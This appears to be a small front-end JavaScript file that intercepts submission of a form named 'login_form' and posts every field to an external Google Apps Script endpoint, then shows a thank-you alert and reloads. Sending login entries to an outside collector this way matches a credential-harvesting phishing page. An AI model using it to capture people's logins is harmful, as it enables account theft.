const scriptURL="https://script.google.com/macros/s/AKfycbwPTvYDI0yi1YjxEkVVnTT2FA07KgGGoM-Ri-0gNxm_ka-eWu4eeWnSdcpT6I7uPYYq/exec"

const form = document.forms['login_form']

form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST' , body: new FormData(form)})
    .then(response => alert("Thank You! Your form is submitted successfully"))
    .then(() => {window.location.reload(); })
    .catch(error => console.error('Error!', error.message))
})